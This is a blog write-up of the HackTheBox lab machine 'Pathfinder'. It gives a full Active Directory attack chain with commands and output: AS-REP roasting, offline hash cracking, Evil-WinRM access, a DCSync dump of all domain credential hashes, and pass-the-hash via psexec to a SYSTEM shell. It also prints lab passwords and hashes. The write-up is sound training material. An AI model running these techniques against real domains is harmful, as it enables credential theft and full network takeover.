---
title: 'HackTheBox write-up: Pathfinder'
author: ib4rz
date: 2021-09-25 17:00
categories: [Starting Point, Windows]
image:
  path: /assets/img/Pathfinder/Pathfinder.png
tags: [Very Easy, Active Directory, BloodHound, Kerberos, John the Ripper, Evil-WinRM, DCSync attack]
---

This is a write-up for the Pathfinder machine on HackTheBox. It was the fifth machine in their "Starting Point" series.

## Basic Information
---

Machine IP: __10.10.10.30__ \
Type: __Windows__ \
Difficulty: __Very Easy__

## Scanning
---

First, to find interesting open ports, let's do some reconnaissance and scanning using [nmap](https://nmap.org/).

```console
$ nmap -p- --open -T5 -v -n 10.10.10.30
```

Parameters explanation:

- _p-_: Scan all 65,535 possible port numbers.
- _open_: Only show open (or possibly open) ports.
- _T5_: Faster scan _(T<0-5>)_.
- _v_: Increase verbosity level.
- _n_: Never do DNS resolution.

It seems to take a long time to scan. Let's examine it in a faster way.

```console
$ nmap -sS --min-rate 5000 -p- --open -vvv -Pn 10.10.10.30
```

Parameters explanation:

- _sS_: TCP SYN scan.
- _min-rate_: Send packets no slower than \<number> per second.
- _p-_: Scan all 65,535 possible port numbers.
- _open_: Only show open (or possibly open) ports.
- _vvv_: Increase verbosity level.
- _Pn_: Treat all hosts as online and skip host discovery.

```console
$ nmap -sS --min-rate 5000 -p- --open -vvv -Pn 10.10.10.30
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-21 14:48 CEST
Initiating Parallel DNS resolution of 1 host. at 14:48
Completed Parallel DNS resolution of 1 host. at 14:48, 1.09s elapsed
DNS resolution of 1 IPs took 1.09s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:48
Scanning 10.10.10.30 [65535 ports]
Discovered open port 445/tcp on 10.10.10.30
Discovered open port 53/tcp on 10.10.10.30
Discovered open port 135/tcp on 10.10.10.30
Discovered open port 139/tcp on 10.10.10.30
Discovered open port 49676/tcp on 10.10.10.30
Discovered open port 464/tcp on 10.10.10.30
Discovered open port 389/tcp on 10.10.10.30
Discovered open port 49677/tcp on 10.10.10.30
Discovered open port 49698/tcp on 10.10.10.30
Discovered open port 593/tcp on 10.10.10.30
Discovered open port 5985/tcp on 10.10.10.30
Discovered open port 3269/tcp on 10.10.10.30
Discovered open port 49718/tcp on 10.10.10.30
Discovered open port 49666/tcp on 10.10.10.30
Discovered open port 9389/tcp on 10.10.10.30
Discovered open port 3268/tcp on 10.10.10.30
Discovered open port 636/tcp on 10.10.10.30
Discovered open port 49667/tcp on 10.10.10.30
Discovered open port 88/tcp on 10.10.10.30
Completed SYN Stealth Scan at 14:49, 26.37s elapsed (65535 total ports)
Nmap scan report for 10.10.10.30
Host is up, received user-set (0.038s latency).
Scanned at 2021-09-21 14:48:35 CEST for 26s
Not shown: 65516 filtered ports
Reason: 65516 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49698/tcp open  unknown          syn-ack ttl 127
49718/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds
           Raw packets sent: 131065 (5.767MB) | Rcvd: 33 (1.452KB)
```

We see that the machine has many open ports.

## Enumeration
---

We can run `Nmap Scripting Engine` for service/version detection running through each port for the best results.

```console
$ nmap -sV -sC -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49667,49676,49677,49698,49718 10.10.10.30
```

Parameters explanation:

- _sV_: Service fingerprinting.
- _sC_: Launch default NSE nmap scripts.
- _p_: Only scan specified ports.

```console
$ nmap -sV -sC -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49667,49676,49677,49698,49718 10.10.10.30
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-21 14:51 CEST
Nmap scan report for 10.10.10.30
Host is up (0.097s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-09-21 19:59:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h08m17s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-09-21T20:00:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.32 seconds
```
Relevant information:

| Port  | Service      | Version                                  |
| ----- | ------------ | ---------------------------------------- |          
| 88    | kerberos-sec | Microsoft Windows Kerberos               |
| 389   | ldap         | Microsoft Windows Active Directory LDAP  |
| 3268  | ldap         | Microsoft Windows Active Directory LDAP  |
| 5985  | http         | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  |

So, on port 88, there's __Kerberos__ running, a network authentication protocol designed to provide strong authentication for client/server applications using secret-key cryptography.

Ports 389, 3268 with __LDAP__. A mature, flexible, and well-supported standards-based mechanism for interacting with directory servers.

Port 5985 uses __WinRM HTTP__, a Windows-native built-in remote management protocol in its simplest form that uses _SOAP_ to interface with remote computers and servers.

## Vulnerability Analysis & Exploitation
---

### Enumeration (Active Directory)
---

> As usual on these "Starting Point" machines, credentials are reused from previous machines.
{: .prompt-info}

We will use Sandra's credentials extracted during the last [Shield](https://ib4rz.github.io/posts/HTB-Shield/) box. So we can attempt to enumerate Active Directory using BloodHund.

> There is a python bloodhound ingester, which can be found [here](https://github.com/fox-it/BloodHound.py). It can also be installed using pip: `pip install bloodhound`.
{: .prompt-info}

```console
$ bloodhound-python -u sandra -p Password1234! -d MEGACORP.LOCAL -c all -ns 10.10.10.30
```

This outputs:

```console
$ bloodhound-python -u sandra -p Password1234! -d MEGACORP.LOCAL -c all -ns 10.10.10.30

INFO: Found AD domain: megacorp.local
INFO: Connecting to LDAP server: Pathfinder.MEGACORP.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: Pathfinder.MEGACORP.LOCAL
INFO: Found 5 users
INFO: Connecting to GC LDAP server: Pathfinder.MEGACORP.LOCAL
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Pathfinder.MEGACORP.LOCAL
INFO: Done in 00M 10S
```

This execution will store four _json_ files in the current directory, which it will later import into Bloodhound.

The next step is to install and configure the [neo4j](https://neo4j.com/) service, which is an open-source graph database.

```console
$ sudo apt install neo4j
$ sudo neo4j console
```

Afterwards, go to `localhost:7474`{: .filepath}, connect to the database with the credentials `neoj4:n4oj4`, and you will be prompted to change your password.

![Desktop View](/assets/img/Pathfinder/neo4j.png){: }

Next, we start BloodHound.

```console
$ bloodhound --no-sandbox
```

Ensure you connect to the database, indicated by a ✔️ symbol at the top of the three input fields. The default username is neo4j, with the password previously set.

![Desktop View](/assets/img/Pathfinder/bloodhound.png){: }

Opening BloodHound, we can drag and drop the _.json_ files, and BloodHound will begin to analyze the data.

![Desktop View](/assets/img/Pathfinder/upload.png){: }


### Analysis
---

BloodHound offers several Pre-Built Analysis queries.

![Desktop View](/assets/img/Pathfinder/analysis.png){: }

We can select various queries, of which some handy ones are `Shortest Paths to High value Targets` and `Find Principles with DCSync Rights`.

__Shortest Paths from Domain Users to High Value Targets__

![Desktop View](/assets/img/Pathfinder/bloodhound1.png){: }

__Find Principles with DCSync Rights__

![Desktop View](/assets/img/Pathfinder/bloodhound2.png){: }

While the latter query returns this:

We can see that the `svc_bes` has `GetChangesAll` privileges to the domain. This means the account can request replication data from the domain controller and gain sensitive information such as user hashes.

### Explotation
---

It's worth checking if Kerberos pre-authentication has been disabled for this account, which means it is vulnerable to `ASREPRoasting`.

> We can check this using a tool such as Impacket's `GetNPUsers` and grab the request service ticket.
{: .prompt-tip}

Type the following command to grab the request ticket.

```console
$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py MEGACORP.LOCAL/svc_bes -dc-ip 10.10.10.30 -request -no-pass
```

Parameters explanation:

- _request_: Requests TGT for users and output them in JtR/hashcat format (default False).
- _no-pass_: Don't ask for password (useful for Kerberos authentication).
- _dc-ip_: IP Address of the domain controller.
- _format_: Format to save the AS_REQ of users without pre-authentication. Default is hashcat.

This outputs:

```console
$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py MEGACORP.LOCAL/svc_bes -dc-ip 10.10.10.30 -request -no-pass
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for svc_bes
$krb5asrep$23$svc_bes@MEGACORP.LOCAL:8576c42381f7fdd8c60f78915def4303$c93a0b635c08240ed73a946bdeb03968c238f8f3907a9c0d72126cd65953335f4e014c200dd27c54d709fb737a1d9a452c6719f5e1250fd7c7ace2579636e628eb2bec468920bc07e191909af1af774cc9b142573e008558362ffae11f56e5014852dafd4703f0d95aa4ed9044f95db8d5b473c51f8cf6a254ff708bc88ab70d071ca6f9012e330a1b5e56b1c1ecdda69764317a284af5531763d9d278ccc4cd77da7891bfbccce6bc7064bf462f5baa22bf78895e19d860cf12237c63da47c10643f46cd119617990ef4ec9afa605ee7e8a72bb881192c28813eb7d1b11d144589a2a5f480429eef52e46a90537e890
```

We grabbed the ticket. Now it's time to power up [John the Ripper](https://www.openwall.com/john/) and crack the hash. First, copy that hash to the file, then run the john.

```console
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

This outputs:

```console
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Sheffield19      ($kr5asrep$23$svc_bes@MEGACORP.LOCAL)
1g 0:00:00:03 DONE (2021-09-25 16:44) 0.2557g/s 2712Kp/s 2712Kc/s 2712KC/s Shokat_2..Shanelee
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We got the password for `svc_bes`!

```yml
username: svc_bes
password: Sheffield19
```

Since we have the username and password, we can use the [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) tool.

> You can install it by typing `gem install evil-winrm`.
{: .prompt-info}

Let's run the tool for the `svc_bes` account. 

```console
$ evil-winrm -u svc_bes -p Sheffield19 -i 10.10.10.30
```
This outputs:

```console
$ evil-winrm -u svc_bes -p Sheffield19 -i 10.10.10.30

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_bes\Documents>
```

The user flag is under `C:\Users\svc_bes\Desktop\user.txt`{: .filepath}. 
Now, time to escalate privileges.

## Privilege Escalation
---

Now we are going to perform [DCSync attack](https://www.qomplx.com/kerberos_dcsync_attacks_explained/) and dump the NTLM hashes of all domain users using the Impacket's [secretsdump.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/secretsdump.py) script.

```console
$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
```

This outputs:

```console
$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f9f700dbf7b492969aac5943dab22ff3:::
svc_bes:1104:aad3b435b51404eeaad3b435b51404ee:0d1ce37b8c9e5cf4dbd20f5b88d5baca:::
sandra:1105:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
PATHFINDER$:1000:aad3b435b51404eeaad3b435b51404ee:0effab7cbed356ad1429a3ad4f82a40c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:056bbaf3be0f9a291fe9d18d1e3fa9e6e4aff65ef2785c3fdc4f6472534d614f
Administrator:aes128-cts-hmac-sha1-96:5235da455da08703cc108293d2b3fa1b
Administrator:des-cbc-md5:f1c89e75a42cd0fb
krbtgt:aes256-cts-hmac-sha1-96:d6560366b08e11fa4a342ccd3fea07e69d852f927537430945d9a0ef78f7dd5d
krbtgt:aes128-cts-hmac-sha1-96:02abd84373491e3d4655e7210beb65ce
krbtgt:des-cbc-md5:d0f8d0c86ee9d997
svc_bes:aes256-cts-hmac-sha1-96:2712a119403ab640d89f5d0ee6ecafb449c21bc290ad7d46a0756d1009849238
svc_bes:aes128-cts-hmac-sha1-96:7d671ab13aa8f3dbd9f4d8e652928ca0
svc_bes:des-cbc-md5:1cc16e37ef8940b5
sandra:aes256-cts-hmac-sha1-96:2ddacc98eedadf24c2839fa3bac97432072cfac0fc432cfba9980408c929d810
sandra:aes128-cts-hmac-sha1-96:c399018a1369958d0f5b242e5eb72e44
sandra:des-cbc-md5:23988f7a9d679d37
PATHFINDER$:aes256-cts-hmac-sha1-96:e1645b5547d26b38d8b5c233595585b2b4102cfb78aff9f839b9ac89c78b1584
PATHFINDER$:aes128-cts-hmac-sha1-96:f6f0a930e371f5aeda450314adf6cfbd
PATHFINDER$:des-cbc-md5:0e45c7d008f7ced0
[*] Cleaning up...
```

As you can see, we have __NTLM__ hash for the Administrator account. We can use this to perform __Pass The Hash attack__ and gain elevated access to the system. Also, we can use Impacket's [psexec.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py) for this too.

```console
$ python3 /usr/share/doc/python3-impacket/examples/psexec.py MEGACORP.LOCAL/Administrator@10.10.10.30 -hashes <NTML hash>
```

This outputs:

```console
$ python3 /usr/share/doc/python3-impacket/examples/psexec.py MEGACORP.LOCAL/Administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.30.....
[*] Found writable share ADMIN$
[*] Uploading file xKTsiDfe.exe
[*] Opening SVCManager on 10.10.10.30.....
[*] Creating service aCAn on 10.10.10.30.....
[*] Starting service aCAn.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
And we are root! Now we can obtain the root flag, which is located in `C:\Users\Administrator\Desktop`{: .filepath}.

We are done. Pathfinder has been Pwned!